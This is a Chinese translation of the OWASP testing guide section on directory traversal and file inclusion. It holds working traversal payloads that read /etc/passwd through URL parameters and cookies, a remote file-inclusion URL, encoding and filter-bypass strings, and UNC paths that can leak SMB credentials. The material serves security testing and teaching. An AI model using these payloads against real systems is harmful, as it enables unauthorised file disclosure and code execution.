# 目录遍历/文件包含测试(OTG-AUTHZ-001)


### 综述
许多web应用将使用和管理文件作为日常操作的一部分。没有使用或部署良好设计的输入验证措施，攻击者可能利用这些系统来读取或改写一下他们并不能访问的文件。在一些特别的情况，攻击者甚至可能执行任意代码或者系统命令。

通常，web服务器和web应用程序实现授权管理机制来控制文件和资源的访问情况。web服务器可能试着在“根目录”或“web根目录”约束用户文件位置，这些目录代表文件系统上的一个物理目录。用户必须将这目录作为整个web应用目录架构的基本目录来看待。

权限定义是使用访问控制列表（ACL）实现的，访问控制列表定义了什么用户或组可以访问、修改或执行服务器上的特点文件。这些机制被设计于防止恶意用户访问敏感文件（如UNIX类系统中常见的/etc/passwd文件）或避免系统命令执行。

许多web应用程序使用服务器端脚本来包含许多不同类型的文件。这种方法常见于管理图片、模板或读取静态文本等等。不幸的是，这些应用的输入参数（如表单参数、cookie值）没有被很好验证的话，那么他们很有可能暴露在安全漏洞之下。

在web服务器和web应用程序中，这类问题带来的是目录遍历/文件包含攻击。通过利用这些漏洞，攻击者可以读取原本不能正常读取访问的目录或文件，包括访问在web根目录之外的数据，或者攻击者可以执行外部网站的脚本文件或其他类型文件。

在这份OWASP测试指南中，只有web应用相关的安全威胁会被考虑，而对于web服务器的威胁暂不考虑（比如著名的 IIS服务器上的“%5c 转义符”问题）。对于有兴趣的读者，更多的阅读建议将在参考资料部分提供。

这种类型的攻击也被称作 点点杠攻击（../），目录遍历，目录爬行或回溯攻击。

在评估过程中，为了发现目录遍历和文件包含缺陷，测试人员需要实施下面两个步骤：
* (**a**) **输入向量枚举* （对于每个输入向量的系统化评价）
* (**b**) **测试技巧** （每个攻击者利用漏洞的攻击技巧的系统化评估）

### 如何测试
#### 黑盒测试
##### 输入向量枚举
为了确定应用系统的那些部分是存在输入严重过程绕过漏洞的，测试者需要枚举所有允许用户提供的内容的部分。这也包含HTTP GET和POST查询以及一下常见的文件上传选项和HTML表单。


这里有一些在这个步骤需要检查的例子：

* 有没有可能被用于文件相关操作的请求参数？
* 有没有不同寻常的文件扩展名？
* 有没有什么有趣的变量名称？

```
http://example.com/getUserProfile.jsp?item=ikki.html
http://example.com/index.php?file=content
http://example.com/main.cgi?home=index.htm
```

* 有没有可能通过web应用动态产生的页面或者膜拜中识别出cookies值？

```
Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower
Cookie: USER=1826cc8f:PSTYLE=GreenDotRed
```


##### 测试技巧

下一个测试阶段是分析web应用中提供的输入验证功能。使用上面的例子，一个动态页面叫做 *getUserProfile.jsp* 从文件读取静态信息，并展示其内容给用户。一个攻击者可能插入恶意字符串 *"../../../../etc/passwd"* 来包含Linux/UNIX系统的密码哈希文件。显然这种攻击只有当输入验证环节发生错误时，并根据文件系统的相关权限，web应用本身能读取这个文件是才能成功。


为了成功测试这些缺陷，测试者需要了解被测试系统的信息和请求文件的位置。在IIS服务器中无法取得 /etc/passwd 文件。

```
http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
```

又比如这个Cookie的例子：

```
Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
```


也有可能包含外部站点的文件和脚本。
```
http://example.com/index.php?file=http://www.owasp.org/malicioustxt
```


下面的例子证明如何不使用任何目录遍历字符来显示CGI组件的源代码。

```
http://example.com/main.cgi?home=main.cgi
```

一个叫做*"main.cgi"*的组件位于正常的HTML静态文件的相同目录。


在一些例子中，测试者需要编码特殊的字符（像 "**.**" 点，"**%00**" NULL字符等等）来绕过文件扩展名限制或阻止其他脚本执行。

<b>Tip：</b>
开发者往往没有预料到所有的编码形式，只进行了基本编码内容的验证，这是一个很常见的错误。如果最初的测试字符串没有成功，可以尝试使用其他编码模式。


每种操作系统都使用不同的字符作为路径分割符号：

*Unix类 OS*:
```
根目录: "/"
目录分割符: "/"
```

*Windows OS*:
```
根目录: "<驱动器盘符>:\"
目录分割符: "\" or "/"
```

*经典 Mac OS*:
```
根目录: "<驱动器盘符>:"
目录分割符: ":"
```

我们应该考虑如下的编码机制：

* URL编码和双重URL编码

```
%2e%2e%2f 代表 ../
%2e%2e/ 代表 ../
..%2f 代表 ../
%2e%2e%5c 代表 ..\
%2e%2e\ 代表 ..\
..%5c 代表 ..\
%252e%252e%255c 代表 ..\
..%255c 代表 ..\ 
等等
```

* Unicode/UTF-8 编码（这个技巧仅适用于语支持超长UTF-8序列的系统中）

```
..%c0%af 代表 ../
..%c1%9c 代表 ..\
```

其他操作系统和应用框架相关的问题也应该被考虑进去，比如windows在解析文件路径非常灵活。

* *Windows shell*: 在命令行路径中加入下面内容，并不会改变命令功能：
	- 在路径最后加入尖括号">" 和 "<"
	- 在路径最后加入双引号（正确闭合的）
	- 额外的当前目录标记符号如"./"或者".\"
	- 额外的父目录标记包含任意存在或者不存在的内容

* 例子：

```
– file.txt
– file.txt...
– file.txt<spaces>
– file.txt””””
– file.txt<<<>>><
– ./././file.txt
– nonexistant/../file.txt
```


* *Windows API*: 下列被作为文件名的字符内容使用在任何命令行命令或者API调用中被抛弃：
```
句点号
空格
```


* *Windows UNC 文件路径*: 被用于SMB共享的文件。有时候，应用程序可能使用远程UNC文件路径来标记文件。这种情况下，Windows SMB服务器可能会发送存储的凭证给攻击者，这些凭证可能被捕获和破解。也可能被结合与指向自我IP地址或域名来躲避过滤器，或用于访问原本不能访问的SMB共享文件（服务器能访问）。
```
\\server_or_ip\path\to\file.abc
\\?\server_or_ip\path\to\file.abc
```


* *Windows NT 设备命名空间*: 用于指向windows设备命名空间，某些引用可能允许使用不同的路径来访问文件系统。
	- 可能等效于驱动器盘符如 c:\ ，甚至是没有分配盘符的磁盘卷标。
        ```\\.\GLOBALROOT\Device\HarddiskVolume1\```
	- 指向机器的第一个光盘驱动器。
        ```\\.\CdRom0\```


#### 灰盒测试
当使用灰盒测试方法来实施分析时候，测试者应该遵循黑盒测试同样的方法论。然而，由于可以审计源代码，所以可能更简单和精确地查找输入向量（*测试阶段（**a**）*）。在源代码审查中，可以使用简单的工具（如*grep*命令）来查找一直或者多种常见应用程序代码编写模式：包含函数/方法，文件系统操作等等。

```
PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...
JSP/Servlet: java.io.File(), java.io.FileReader(), ...
ASP: include file, include virtual, ...
```


使用在线代码搜索引擎（如 Ohloh Code[http://code.ohloh.net/]），可能找到互联网上公开的开源软件的路径遍历缺陷。

对于PHP，测试者能使用：
```
lang:php (include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```

使用灰盒测试方法能发现通常情况下无法找到的漏洞，这些漏洞甚至可能是标准黑盒测试评估中无法找的。


一些web应用使用数据库中的值和参数来生成动态页面。可以在应用程序向数据库添加数据时候插入特殊定制的路径遍历字符串。这类的安全问题很难被发现，因为其中的参数是在包含函数之中的，被看作内部使用的和“安全”的，然而事实上却不是如此。


此外，通过审计源代码，能分析纳西被用于处理非法输入的函数：一下开发者尝试改变非法输入为合法输入来避免警告和错误。这些功能函数通常引入安全缺陷。


思考如下指令的web应用程序：
```
filename = Request.QueryString(“file”);
Replace(filename, “/”,”\”);
Replace(filename, “..\”,””);
```

通过下列方法来利用其中安全缺陷：
```
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini
```
<br>


### 测试工具
* DotDotPwn - The Directory Traversal Fuzzer - http://dotdotpwn.sectester.net
* Path Traversal Fuzz Strings (from WFuzz Tool) - http://code.google.com/p/wfuzz/source/browse/trunk/wordlist/Injections/Traversal.txt
* Web Proxy ([*Burp Suite*](http://portswigger.net), [*Paros*](http://www.parosproxy.org/index.shtml),  [*WebScarab*](http://www.owasp.org/index.php/OWASP_WebScarab_Project), [*Zed Attack Proxy (ZAP)*](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) )
* Enconding/Decoding tools
* String searcher "grep" - http://www.gnu.org/software/grep/


### 参考资料
**白皮书**
* phpBB Attachment Mod Directory Traversal HTTP POST Injection - http://archives.neohapsis.com/archives/fulldisclosure/2004-12/0290.html
* Windows File Pseudonyms: Pwnage and Poetry - http://www.slideshare.net/BaronZor/windows-file-pseudonyms

